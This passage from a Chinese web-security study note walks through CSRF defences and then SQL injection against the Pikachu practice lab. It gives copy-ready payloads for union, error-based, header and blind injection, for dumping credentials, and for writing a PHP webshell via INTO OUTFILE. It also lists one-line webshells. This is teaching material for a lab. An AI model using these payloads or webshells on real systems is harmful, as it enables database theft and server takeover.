post型，因为是请求体，不能在url中，和xsspost类似需要自己弄一个站点，做一个表单，让Lucy点我们恶意站点表单的url，向页面提交post请求。

#### 3.3.3Anti CSRF token

CSRF的主要问题是敏感操作的链接容易被伪造,那么如何让这个链接不容易被伪造?-
\-每次请求,都增加一个随机码(需要够随机，不容易伪造)， 后台每次对这个随机码进行验证!-
Ant上CSRF ( token )项目的token生成代码:

![](https://cubox.pro/c/ filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F0641d31a6c1a4643a00b0faba42c5659.png)

#### 3.3.4常见CSRF防范措施

增加token验证(常用的做法) :-
1，对关键操作增加token参数，token值必须随机，每次都不一样;-
关于安全的会话管理(避免会话被利用) :-
1，不要在客户端端保存敏感信息(比如身份认证信息) ;-
2，测试直接关闭，退出时，的会话过期机制;-
3，设置会话过期机制，比如15分钟内无操作，则自动登录超时;-
访问控制安全管理:-
1，敏感信息的修改时需要对身份进行二次认证，比如修改账号时,需要判断旧密码;-
2，敏感信息的修改使用post，而不是get ;-
3，通过http头部中的referer来限制原页面-
增加验证码:-
一般用在登录(防暴力破解) ,也可以用在其他重要信息操作的表单中(需要考虑可用性)

## 3.4SQL-Inject（SQL注入漏洞）
#### 3.4.1SQL Inject漏洞原理概述

在owasp发布的top 10漏洞里面，注入漏洞一直是危害排名第一，其中主要指SQL Inject漏洞。-
数据库注入漏洞,主要是开发人员在构建代码时,没有对==输入边界==进行安全考虑,导致攻击着可以通过合法的输入点提交一些精心构造的语句 ,从而欺骗后台数据库对其进行执行,导致数据库==信息泄漏==的一种漏洞。

> ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2Fbc20edb526334474b6662299f0ef9d1b.png)-
> 正常输入：1 select email from users where id= 1;-
> 非法输入：1or1=1 select email from users where id= 1 or 1=1；

**SQL Inject 漏洞攻击流程**

1.  第一步:注入点探测-
    自动方式:使用web漏洞扫描工具，自动进行注入点发现-
    手动方式:手工构造sq| inject测试语句进行注入点发现
2.  第二步:信息获取-
    通过注入点取期望得到的数据。-
    1.环境信息:数据库类型,数据库版本,操作系统版本,用户信息等。-
    2.数据库信息:数据库名称,数据库表，表字段,字段内容(加密内容破解)
3.  第三步:获取权限-
    获取操作系统权限:通过数据库执行shell,上传木马-
    常见的注入点类型：-
    数字型

    user_ id= $id
    
        

字符型

    user. id= '$id' 
    
        

搜索型

    text LIKE '%{$_ GET['search']}%'"
    
        

#### 3.4.2注入方式get&post&搜索型&xx型

**pikachu- SQL-Inject- 数字型注入**-
post型注入演示-
下拉框随意点击一个数字-
![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F1b628dd23ad9488e81dd83005ee9b1a2.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_d3F5LXplbmhlaQ%2Cshadow_50%2Ctext_Q1NETiBAd3lkMjAwMQ%3D%3D%2Csize_20%2Ccolor_FFFFFF%2Ct_70%2Cg_se%2Cx_16)-
发现url中并没有传参，提交方式为post方式。-
先测试这个输入点是否存在漏洞。正常逻辑我们输入一个id，之后返回数据，应该是后台在数据库中进行了查询，返回了姓名和邮箱可以认为语句是

    select 字段1，字段2 from 表名 where id = 1
    
        

后端接收应该是：`$id=$_POST['id']`之后把接收到的参数传进去。-
我们点击数字1，进行查询，之后打开burp查看抓包。![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F83b3a42a29ca4122a2c78ae1e2aca109.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_d3F5LXplbmhlaQ%2Cshadow_50%2Ctext_Q1NETiBAd3lkMjAwMQ%3D%3D%2Csize_20%2Ccolor_FFFFFF%2Ct_70%2Cg_se%2Cx_16)-
选中发送到Repeater，我们在输入点输入一段payload：1 or 1=1，点击提交。![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2Fac2a3f15e75f457e9351f79c751b1af9.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_d3F5LXplbmhlaQ%2Cshadow_50%2Ctext_Q1NETiBAd3lkMjAwMQ%3D%3D%2Csize_20%2Ccolor_FFFFFF%2Ct_70%2Cg_se%2Cx_16)-
点击Render，可以查看返回界面。-
![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F77def960ccb54597bb86b4d5b9b98c93.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_d3F5LXplbmhlaQ%2Cshadow_50%2Ctext_Q1NETiBAd3lkMjAwMQ%3D%3D%2Csize_13%2Ccolor_FFFFFF%2Ct_70%2Cg_se%2Cx_16)-
结果就是它将所有的用户和邮箱全部返回在页面上。-
**pikachu- SQL-Inject- 字符型注入**-
随意输入一段字符，点击提交提示用户名不存在。发现请求在url中。![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2Fff5b8a586e03474e827a094e656da3a5.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_d3F5LXplbmhlaQ%2Cshadow_50%2Ctext_Q1NETiBAd3lkMjAwMQ%3D%3D%2Csize_20%2Ccolor_FFFFFF%2Ct_70%2Cg_se%2Cx_16)-
正常返回是两个字段，用户名和邮箱。我们可以对后台运行做出猜想。

    select 字段1，字段2 from 表名 where username = '111';
    
        

后台接收：`$uname=$_GET['username']`-
与xss差不多我们要构成一个合法闭合。字符串需要加单引号才合法。我们需要把前后两个单引号注释掉。输入`kobe' or 1=1#`第一个单引号会将前面的单引号闭合，后面的#号会注释掉后面的单引号。我们尝试提交。-
![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2Ff5d9d321338e468b9833db0b30fa1662.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_d3F5LXplbmhlaQ%2Cshadow_50%2Ctext_Q1NETiBAd3lkMjAwMQ%3D%3D%2Csize_12%2Ccolor_FFFFFF%2Ct_70%2Cg_se%2Cx_16)-
结果会将数据库表中的东西遍历出来。-
**搜索型注入**-
输入字符k，点击提交，观察结果。-
![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F3df82c635bc54efdb19dbc0a2d85fa6f.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_d3F5LXplbmhlaQ%2Cshadow_50%2Ctext_Q1NETiBAd3lkMjAwMQ%3D%3D%2Csize_14%2Ccolor_FFFFFF%2Ct_70%2Cg_se%2Cx_16)-
返回了所有含有k的用户。

    select from 表名 where username like ' %k% ';
    
        

这种查询比get多了%号，我们要想办法构造一个合法的闭合。

    select from 表名 where username like ' %666%'or 1=1 #% ';
    
        

我们输入字符查看结果。-
![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2Ff6f8a6c03e3e4053801c30358b16834c.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_d3F5LXplbmhlaQ%2Cshadow_50%2Ctext_Q1NETiBAd3lkMjAwMQ%3D%3D%2Csize_14%2Ccolor_FFFFFF%2Ct_70%2Cg_se%2Cx_16)-
只要理解，猜测后台如何拼接，设置合法的payload，构造闭合。-
**xx型注入**-
查看后端代码，多除了括号，我们还是进行闭合。-
输入xx’) or 1=1 # ，查看结果。-
![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F55b3af0fd4504ddf956c062c7ab6ff22.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_d3F5LXplbmhlaQ%2Cshadow_50%2Ctext_Q1NETiBAd3lkMjAwMQ%3D%3D%2Csize_11%2Ccolor_FFFFFF%2Ct_70%2Cg_se%2Cx_16)-
所以说只要构造闭合成功就可以了。-
![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F67638f301fe84d5c8a0d413a2c100732.png)

#### 3.4.3SQL Inject漏洞手工测试:基于union联合查询的信息获取( select )

union联合查询:可以通过联合查询来查询指定的数据-
用法举例:-
select username,password from user where id=1 union select 字段1 ,字段2 from 表名-
联合查询的字段数需要和主查询一致!-
打开字符型注入，输入a’ order by 5#。-
![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2Ff93621f100a0470a8210f1b7bb8ebf62.png)-
说明第五列不存在。这个时候我们试一下3。-
![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2Fbccb884bd616418da894682ce29e0068.png)-
说明第三列也不存在。我们再换成2。-
![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2Fd2f72a923109461995703172e0db5430.png)-
正常报错，意味着主查询里只有两个字段。确认字段后，构建union。

    a' union select database(),uesr()#
    
        

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F0090519aa4b2429b99ec9ff3d8c6fd66.png)-
这个时候就会把数据库名称，当前用户，当前用户权限显示出来。-
我们还可以查他的版本。

    a' union select version(),4#
    
        

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2Fcd1d59174d9f468f81fd5d431a55890e.png)-
这里版本号和数字四就被打印输出来了。-
还可以查其他东西，自己发挥了。以下仅供参考。

> Select version(); //取的数据库版本-
> Select database(); //取得当前的数据库-
> Select user(); //取得当前登录的用户-
> order by X //对查询的结果进行排序,按照第X列进行排序，默认数字0-9 ,字母a-z-
> 思路:对查询的结果使用order by按照指定的列进行排序,如果指定的列不存在,数据库会报错。通过报错判断查询结果的列数,从而确定主查询的字段数。

#### 3.4.4通过information\_ schema拿下数据库手工测试完整案例演示

> **MYSQL小知识补充: information\_ schema**-
> 在mysq|中,自带的information\_schema这个表里面存放了大量的重要信息。具体如下:-
> 如果存在注入点的话，可以直接尝试对该数据库进行访问，从而获取更多的信息。-
> 比如:-
> SCHEMATA表:提供了当前mysq|实例中所有数据库的信息。是show databases的结果取之此表。-
> TABLES表:提供了关于数据库中的表的信息(包括视图)。详细表述了某个表属于哪个schema ,表类型,表引擎,创建时间等信息。是show tables from schemaname的结果取之此表。-
> COLUMNS表:提供了表中的列信息。详细表述了某张表的所有列以及每个列的信息。是show columns from schemaname.tablename的结果取之此表。

以字符型为栗子，我们站在测试者的角度判断是否存在SQL注入漏洞，以及如何获取数据。-
我们先输入一个单引号进行测试。提交发现出现报错。![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2Fd8bd9d0e31ab49c6b47f8d3593bc1e30.png)-
在单引号处出现了语法错误，那么我们就会知道我们输入的单引号已经被拼接到SQL里面了。也就意味着这里存在着SQL注入漏洞。它会把前端输入当作数据库里的一部分逻辑去处理。-
我们猜测是字符型的，去做一个小测试。-
输入`kobe' or 1=1#`，然后点击提交。-
![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2Fc1eb830b4b5c4097a5de6e7335c582da.png)-
结果发现可以遍历出数据。但是现在的结果并不能满足我们😈。我们可以在获取一下它的基础信息。我们使用联合查询，在联合查询之前我们先使用order by，确定有多少个字段。输入`kobe' order by 3#`，出现报错。-
![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2Fd1262554a405458bb6f0cda19d29d475.png)-
输入`kobe' order by 2#`-
![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F09d92ad7a166414fba1f84337db9b541.png)-
成功查询出来了，我们可以确定这里主查询有两个字段。确定字段之后我们就可以做联合查询。想要获取information\_ schema中的数据，至少要知道数据库名称。

    kobe' union select database(),user()#
    
        

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2Fc4196a003ab74164b1191e78e6c076f9.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_d3F5LXplbmhlaQ%2Cshadow_50%2Ctext_Q1NETiBAd3lkMjAwMQ%3D%3D%2Csize_11%2Ccolor_FFFFFF%2Ct_70%2Cg_se%2Cx_16)-
数据库名称为pikachu。拿到名称后我们就可以通过information\_ schema去获取数据。通过union联合查询，然后通过information\_ schema去获取pikachu一共有多少个表，表的名称是什么。

    kobe' union select table_schema,table_name from information_schema.tables where table_schema='pikachu'#
    
        

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F5eada827805244d8b654233560e93a4a.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_d3F5LXplbmhlaQ%2Cshadow_50%2Ctext_Q1NETiBAd3lkMjAwMQ%3D%3D%2Csize_10%2Ccolor_FFFFFF%2Ct_70%2Cg_se%2Cx_16)-
除了正常的查询，pikachu数据库中所有表的名称也被我们爆出来了。我们进一步分析，我们发现有一个表名叫做users，我们可以猜测是不是所有的用户名密码都在其中。

    kobe' union select table_name,column_name from information_schema.columns where table_name='users'#
    
        

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F723b727bab1a45d08a31471e3842dba2.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_d3F5LXplbmhlaQ%2Cshadow_50%2Ctext_Q1NETiBAd3lkMjAwMQ%3D%3D%2Csize_11%2Ccolor_FFFFFF%2Ct_70%2Cg_se%2Cx_16)-
我们可以发现有账号密码。是不是我们能够拿到账号密码呢？现在其实已经很简单了。

    kobe' union select username,password from users#
    
        

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2Fc327dc7bf88640c8bc419a2bdf3bb877.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_d3F5LXplbmhlaQ%2Cshadow_50%2Ctext_Q1NETiBAd3lkMjAwMQ%3D%3D%2Csize_15%2Ccolor_FFFFFF%2Ct_70%2Cg_se%2Cx_16)-
账号密码已经到手，但是我们可以看出密码是做过加密处理的，根据长度我们可以判断应该MD5加密，我们可以在网上做一些碰撞，解出明文。![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2Fbc18b167c46f4c7eab0d3507ca95de92.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_d3F5LXplbmhlaQ%2Cshadow_50%2Ctext_Q1NETiBAd3lkMjAwMQ%3D%3D%2Csize_20%2Ccolor_FFFFFF%2Ct_70%2Cg_se%2Cx_16)-
这是我们的目的已经达成了。

#### 3.4.5SQL Inject漏洞手工测试:基于报错的信息获取(select/delete/update/insert)

技巧思路：-
在MYSQL中使用一些指定的函数来制造报错,从而从报错信息中获取设定的信息。select/insert/update/delete都可以使用报错来获取信息。-
背景条件：-
后台没有屏蔽数据库报错信息，在语法发生错误时会输出在前端。

> **基于报错的信息获取------三个常用的用来报错的函数**-
> updatexml() :函数是MYSQL对XML文档数据进行查询和修改的XPATH函数。-
> extractvalue():函数也是MYSQL对XML文档数据进行查询的XPATH函数。-
> floor(): MYSQL中用来取整的函数。

**updatexml()**-
Updatexm()函数作用: 改变(查找并替换) XML文档中符合条件的节点的值。-
语法: UPDATEXML (xml document, XPathstring, new\_value)

> 第一个参数: fiedname是String格式，为表中的字段名。-
> 第二个参数: XPathstring (Xpath格式的字符串)。-
> 第三个参数: new. value，String格式，替换查找到的符合条件的

Xpath定位必须是有效的，否则会发生错误。-
**Select下报错的利用演示**-
我们还是那字符型注入做演示，首先我们应该判断有没有报错，会不会在前端显示。我们输入单引号，发现有注入报错。![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F25d37148bf3d460589395f46defadb80.png)-
现在我们构造一个报错。

    kobe' and updatexml(1,version(),0)#
    
        

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F7ceb52075194466e9cd7748f3e8979f3.png)-
.26什么鬼东西，它并没有把version对应的版本号爆出来。现在对payload进行改造。

    kobe' and updatexml(1,concat(0x7e,version()),0)#
    
        

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F37be29f96db64878838e1e474f04a6af.png)-
我们已经获取到了版本号。现在我们可以把version替换成任意我们想要获得的东西。

    kobe' and updatexml(1,concat(0x7e,database()),0)#
    
        

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2Ffd66a18647c346dabeafc9b0d102e306.png)-
数据库名称已经获取。我们在进行进一步查询。

    kobe' and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema='pikachu')),0)#
    
        

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2Faf6b1e095a254425a3fc5052bed6dc97.png)-
报错返回的数据多余一行。说明报错有多行。再次进行处理。可以使用limit一次一次进行获取表名。

    kobe' and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema='pikachu' limit 0,1)),0)#
    
        

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F0c3730f2d03d4919b39f58f382052f57.png)-
我们可以得到第一个表名。想要得到第二个表名只要把0改成1即可。依此类推，可以得到所有表名。在获取表名之后，思路一样，获取列名。

    kobe' and updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_name='users' limit 0,1)),0)#
    
        

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F8dea07491090477ab055e66e4067eacb.png)-
同样的依此类推，得到所有列名。在获取列名后，再来获取数据。

    kobe' and updatexml(1,concat(0x7e,(select username from users limit 0,1)),0)#
    
        

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F4d68ebb342594f29bd4990c64e8dd53f.png)-
获取了第一个用户名，再根据用户名查询密码。

    kobe' and updatexml(1,concat(0x7e,(select password from users where username='admin' limit 0,1)),0)#
    
        

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2Fea2bde47e0a24c72a025c8efa98068a8.png)-
获取MD5加密的密文，解密获取明文密码。-
**insert/update注入**-
我们点击注册-
![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F09ce3065acf5453d997f45790299bf32.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_d3F5LXplbmhlaQ%2Cshadow_50%2Ctext_Q1NETiBAd3lkMjAwMQ%3D%3D%2Csize_16%2Ccolor_FFFFFF%2Ct_70%2Cg_se%2Cx_16)-
一样的方法判断是否有SQL注入漏洞，经过判断之后发现存在SQL漏洞。重点在于怎么构造insert的payload。

    用户名输入xiaohong' or updatexml(1,concat(0x7e,database()),0) or '
    
        

密码随意。点击提交。-
![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F08646f4b9a1a4f8b84d29b811bd2b048.png)-
得到数据库名。思路一样把database做替换，得到想要的信息。-
update与insert是一模一样的。我们先登录用户。

> 在这里可能会有人显示不出来信息，可以参考解决方案。-
> 在使用pikachu的时候发现一点问题，好像是由php版本较高导致的不兼容，如图：-
> ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F3dbb44c7315b468ab1c252a2e93ecd9a.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_d3F5LXplbmhlaQ%2Cshadow_50%2Ctext_Q1NETiBAd3lkMjAwMQ%3D%3D%2Csize_20%2Ccolor_FFFFFF%2Ct_70%2Cg_se%2Cx_16)-
> 在这里我们打开这个路径，找到第70行，把MYSQL\_ASSOC改成MYSQLI\_ASSOC，保存文件，刷新网页。就可以啦。-
> 原因：在php7中，MYSQL\_ASSOC不再是一个常量，将 MYSQL\_ASSOC改为MYSQLI\_ASSOC，意思是mysqli的方式提取数组，而不再是mysql 。（原因：mysql\_fetch\_arrayhan函数转为mysqli\_fetch\_array，参数没有修改）

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F8e010a369ab94517ab85d77fafb525bf.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_d3F5LXplbmhlaQ%2Cshadow_50%2Ctext_Q1NETiBAd3lkMjAwMQ%3D%3D%2Csize_20%2Ccolor_FFFFFF%2Ct_70%2Cg_se%2Cx_16)-
这个修改就是通过update。这里就存在update漏洞。我们输入刚刚的payload。-
![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F08646f4b9a1a4f8b84d29b811bd2b048.png)-
爆出数据库名称，之后逻辑就一样了。-
**delete注入**-
点击删除留言，留言被删除，我们打开burp查看抓包。-
![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2Ff9d5efa8d1124c228cde9767a0a82772.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_d3F5LXplbmhlaQ%2Cshadow_50%2Ctext_Q1NETiBAd3lkMjAwMQ%3D%3D%2Csize_20%2Ccolor_FFFFFF%2Ct_70%2Cg_se%2Cx_16)-
将其发送到Repeater。我们可以把id构成闭合。

    1 or updatexml(1,concat(0x7e,database()),0)
    
        

选中右键，convert selection，对其进行url编码。-
![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2Fb83d635c0586408396c0a3f872266eeb.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_d3F5LXplbmhlaQ%2Cshadow_50%2Ctext_Q1NETiBAd3lkMjAwMQ%3D%3D%2Csize_20%2Ccolor_FFFFFF%2Ct_70%2Cg_se%2Cx_16)-
按照我们的期望返回了数据库名称。-
**extractvalue()**-
extractvalue()函数作用:从目标XML中返回包含所查询值的字符串。-
语法: ExtractValue(xm| \_document, xpath. string)

> 第一个参数: XML document是String格式，为XML文档对象的名称,文中为Doc-
> 第二个参数: XPath\_ string (Xpath格式的字符串)

Xpath定位必须是有效的,否则会发生错误。-
打开字符型注入，输入payload。

    kobe' and extractvalue(0,concat(0x7e,version()))#
    
        

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2Fbe582abc108c4a6a9d34d5cd3cb7cb7d.png)-
效果差不多，理解即可。-
**floor()**-
在字符型中输入payload得到版本号。

    kobe' and (select 2 from (select count(*),concat(version(),floor(rand(0)*2))x from information_schema.tables group by x)a)#
    
        

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F1b5ecc996e07424eaffcee5a18f28fa9.png)-
同样进行替换我们可以得到其他你想知道的东西。

#### 3.4.6SQL注入漏洞-基于http header的注入

> 什么是Http Header注入-
> 有些时候，后台开发人员为了验证客户端头信息(比如常用的cookie验证)-
> 或者通过http header头信息获取客户端的一些信息，比如useragent、accept字段等等。-
> 会对客户端的http header信息进行获取并使用SQL进行处理,如果此时没有足够的安全考虑，则可能会导致基于http header的SQL Inject漏洞。

点击提示，获得账号密码，登录账号。-
![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2Ffdd5008463a84af09fa2c0c054869809.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_d3F5LXplbmhlaQ%2Cshadow_50%2Ctext_Q1NETiBAd3lkMjAwMQ%3D%3D%2Csize_20%2Ccolor_FFFFFF%2Ct_70%2Cg_se%2Cx_16)-
后台对HTTP头数据进行了获取，进行了相关的数据库操作。-
我们通过burp的数据包进行测试。-
![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2Fafa166a26af4446b8081ef8827fbc1f4.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_d3F5LXplbmhlaQ%2Cshadow_50%2Ctext_Q1NETiBAd3lkMjAwMQ%3D%3D%2Csize_20%2Ccolor_FFFFFF%2Ct_70%2Cg_se%2Cx_16)-
将其发送到repeater。修改agent为单引号提交，查看结果。

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F463103265b4c43399bd21bcfdb0e2851.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_d3F5LXplbmhlaQ%2Cshadow_50%2Ctext_Q1NETiBAd3lkMjAwMQ%3D%3D%2Csize_20%2Ccolor_FFFFFF%2Ct_70%2Cg_se%2Cx_16)-
判断有SQL注入漏洞。输入我们的payload

    firefox' or updatexml(1,concat(0x7e,database()),0) or '
    
        

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F7a3693dc49f5446e93acd83dd2125888.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_d3F5LXplbmhlaQ%2Cshadow_50%2Ctext_Q1NETiBAd3lkMjAwMQ%3D%3D%2Csize_20%2Ccolor_FFFFFF%2Ct_70%2Cg_se%2Cx_16)-
返回了数据库名称。

#### 3.4.7SQL注入漏洞-盲注( boolian base )原理及测试

什么是盲注？-
在有些情况下,后台使用了错误消息屏蔽方法(比如@ )屏蔽了报错-
此时无法在根据报错信息来进行注入的判断。-
这种情况下的注入，称为“盲注"-
根据表现形式的不同，盲注又分为based boolean和based time两种类型

基于boolean的盲注主要表现症状:

> 0.没有报错信息-
> 1.不管是正确的输入，还是错误的输入，都只显示两种情况(我们可以认为是0或者1)-
> 2.在正确的输入下，输入and 1= 1/and 1= 2发现可以判断

打开Boolean的盲注，输入

    kobe' and 1=1#
    
        

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2Fcfe01df3f27f4cdfb908574ed8106d7f.png)-
打印了正确的kobe的信息。我们再把一改成二输入。-
![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2Fd834506f305843898221bf1089c3255d.png)-
对比说明存在SQL注入漏洞。我们尝试之前的方法发现都行不通。

    kobe' and ascii(substr(database(),1,1))>113#
    
        

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2Fd2057504e8944030b0270128a97a5917.png)-
查询不存在，改为=112。-
![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F755401f53d69421a8284e590f40d945a.png)-
显示正确信息。-
112对应的字母就是p,数据库的第一个字符就是p。依次修改得到数据库名字。之后思路就打开了。

#### 3.4.8SQL注入漏洞盲注( time base )原理及测试

如果说基于boolean的窗注在页面上还可以看到0 or 1的回显的话-
那么基于time的盲注完全就啥都看不到了!-
但还有一个条件，就是“时间”， 通过特定的输入，判断后台执行的时间,从而确认注入!-
常用的Teat Payload:-
kobe’ and sleep(5)#-
看看输入: kobe和输入kobe and sleep(5)#的区别,从而判断这里存在based time的SQL注入漏洞。-
打开基于时间的盲注。输入单引号。-
![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F9bec6a484fdf4f068d32f1b4b288da39.png)-
我们进行其他尝试都是一样的结果。我们打开web控制器。打开网络，输入

    kobe' and sleep(5)#
    
        

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F1775a96b65b145f29059a9ebd8ae0030.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_d3F5LXplbmhlaQ%2Cshadow_50%2Ctext_Q1NETiBAd3lkMjAwMQ%3D%3D%2Csize_20%2Ccolor_FFFFFF%2Ct_70%2Cg_se%2Cx_16)

我们发现页面没有立刻返回前端页面，而是暂停了5.12毫秒，说明执行了我们的payload。说明存在一个基于时间的payload。

    kobe' and if((substr(database(),1,1))='p',sleep(5),null)#
    
        

时间停止了5秒，则说明第一个字符是p。如果时间不停止，则说明不是p。

#### 3.4.9os远程控制

**一句话木马**-
一句话木马是一种短小而精悍的木马客户端，隐蔽性好，且功能强大。-
PHP: < ?php @eval($\_ POST’chopper’\]);?>-
ASP: < %eval request(" chopper")%>-
ASP.NET: <%@ Page Language= Jscript" %> <%eval(Request.Item"chopper"\], "unsafe );%>

select 1,2 into outfile “/var/www/html/1.txt”-
into outfile 将select的结果写入到指定目录的1.txt中-
在一些没有回显的注入中可以使用into outfile将结果写入到指定文件，然后访问获取-
前提条件:-
1.需要知道远程目录-
2.需要远程目录有写权限-
3.需要数据库开启了secure\_ file\_ priv-
字符型注入：-
获取操作系统权限：

    kobe' union select "<?php @eval($_GET['test'])?>",2 into outfile "/val/www/html/1.php"#
    
        

#### 3.4.10SQL Inject漏洞之表(列)名的暴力破解

字符型注入举例-
payload：

    kobe' and exists(select * from aa)#
    kobe' and exists(select id from users)#
    
        

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2Fb502338b737644fe945aff940dc36b14.png)-
输入第一个payload，返回结果说明没有这个表。打开burp抓包，发送到intrudder。思路与暴力破解一样。clear之后选中aa，进行替换。-
